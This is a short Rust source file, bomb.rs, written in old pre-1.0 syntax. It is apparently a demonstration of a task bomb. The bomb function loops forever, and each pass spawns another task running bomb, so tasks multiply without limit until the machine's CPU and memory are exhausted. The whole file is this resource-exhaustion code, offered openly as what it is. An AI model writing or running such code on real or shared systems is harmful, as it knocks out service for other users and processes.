// bomb.rs
// Andrew Pennebaker

use std;

fn bomb() {
  while true {
    task::spawn(bomb);
  }
}

fn main() {
  task::spawn(bomb);
}